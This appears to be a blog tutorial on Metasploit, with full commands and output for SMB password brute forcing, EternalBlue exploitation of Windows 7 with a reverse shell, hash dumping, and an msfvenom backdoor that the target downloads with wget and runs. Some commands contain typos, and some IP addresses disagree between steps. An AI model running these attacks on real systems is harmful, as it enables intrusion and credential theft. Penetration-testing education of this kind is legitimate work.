title: Metasploit
date: 2024-07-10
category: security
tags: security, hacking

## Disclaimer

Do not hack any system you're not allowed to. I provide this
information in good faith, to educate the reader so that we can all
better guard against against from bad actors.

## Starting the Metasploit shell

```text
$ msfconsole
```

## Perform a port scan

```text
msf6> use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.10.24.171
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.10.24.171:         - 10.10.24.171:22 - TCP OPEN
[+] 10.10.24.171:         - 10.10.24.171:21 - TCP OPEN
[+] 10.10.24.171:         - 10.10.24.171:139 - TCP OPEN
[+] 10.10.24.171:         - 10.10.24.171:445 - TCP OPEN
[+] 10.10.24.171:         - 10.10.24.171:8000 - TCP OPEN
[*] 10.10.24.171:         - Scanned 1 of 1 
```

This shows why you should have a firewall.

## Cracking a Windows user's password

This assumes the user `lisa`'s password is in `/tmp/huge-list-of-passwords.txt`:


```text
msf6> use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 192.168.1.4
msf6 auxiliary(scanner/smb/smb_login) > set smbuser lisa
msf6 auxiliary(scanner/smb/smb_login) > set pass_file /tmp/huge-list-of-passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > run
..
[+] 10.10.24.171:445      - 10.10.24.171:445 - Success: '.\lisa:love123'
```

This shows how important it is that users choose non-trivial
passwords.

## Figure out what's running on a given port

```text
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set rport 8000
msf6 auxiliary(scanner/http/http_version) > run
msf6 auxiliary(scanner/http/http_version) > run
[+] 10.10.24.171:8000 webfs/1.21 ( 403-Forbidden )
```

This shows why you should have minimal server version strings.

## Crack an unpatch Windows 7 machine

Check if the machine is vulnerable:

```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > setg rhosts 10.10.162.197
rhosts => 10.10.162.197
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.10.162.197:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.162.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Then load the exploit and select a payload
```text
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
..
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
payload => generic/shell_reverse_tcp
```

Finally, run the exploit:
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

[*] Started reverse TCP handler on 10.10.70.92:4444 
[*] 10.10.162.197:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.162.197:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.162.197:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.162.197:445 - The target is vulnerable.
[*] 10.10.162.197:445 - Connecting to target for exploitation.
[+] 10.10.162.197:445 - Connection established for exploitation.
[+] 10.10.162.197:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.162.197:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.162.197:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.162.197:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.162.197:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.162.197:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.162.197:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.162.197:445 - Sending all but last fragment of exploit packet
[*] 10.10.162.197:445 - Starting non-paged pool grooming
[+] 10.10.162.197:445 - Sending SMBv2 buffers
[+] 10.10.162.197:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.162.197:445 - Sending final SMBv2 buffers.
[*] 10.10.162.197:445 - Sending last fragment of exploit packet!
[*] 10.10.162.197:445 - Receiving response from exploit packet
[+] 10.10.162.197:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.162.197:445 - Sending egg to corrupted connection.
[*] 10.10.162.197:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.70.92:4444 -> 10.10.162.197:49165) at 2024-07-10 09:17:58 +0100
[+] 10.10.162.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.162.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.162.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 1 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

Now, attach to the backdoor:
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                          Connection
  --  ----  ----               -----------                          ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Ve  10.10.70.92:4444 -> 10.10.162.197:4
                               rsion 6.1.7601] -----                9165 (10.10.162.197)

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```


Get the pasword hashes by upgrading the shell session to a meterpreter session:

```text
msf6> sessions -u 1
msf6> sessions -l

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows   10.10.70.92:4444 -> 10.10.162.19
                                     [Version 6.1.7601] -----          7:49165 (10.10.162.197)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC      10.10.70.92:4433 -> 10.10.162.19
                                                                       7:49188 (10.10.162.197)

```

Now, use that new session to gather the hashes 

```
msf6> use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set session 2 
session => 2
msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

Administrator:500:fsadf:afdafds:::
Guest:501:asdfasfd:sdfafds:::
john:1001:asdfads:asdfadfs:::

[*] Post module execution completed
msf6 post(windows/gather/hashdump) >
```

## Get access to a Linux by installing a backdoor

First, create the backdoor software, aka a _payload_:
```text
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.198 LPORT=5555 -f elf > backdoor.elf
# python -m http.server
```

Where `192.168.1.198` is the machine and `5555` the port, where you
want the backdoor to call back to.

Now, get the `backdoor.elf` installed and run on the other Linux machine:
```
$ wget http://192.168.1.198:8000/backdoor.elf
$ chmod +x backdoor.elf
$ ./backdoor.elf
```

Now, on your machine, load an exploit that allows to spawn a shell via
the backdoor:
```text
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 10.10.130.198
msf6 exploit(multi/handler) > use lport 5555
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

And with that, you should have a shell on the other machine via the backdoor:
```text
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.130.198:5555 
[*] Sending stage (1017704 bytes) to 10.10.125.85
[*] Meterpreter session 1 opened (10.10.130.198:5555 -> 10.10.125.85:42224) at 2024-07-15 04:55:49 +0100

meterpreter > 
```

Now, you can run whatever post modules you want, like dumping the password hashes:
```text
meterpreter > bacground
msf6 exploit(multi/handler) > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > set session 1
session => 1
msf6 post(linux/gather/hashdump) > run
```

You should now have a listing of all the password hashes on the
machine.

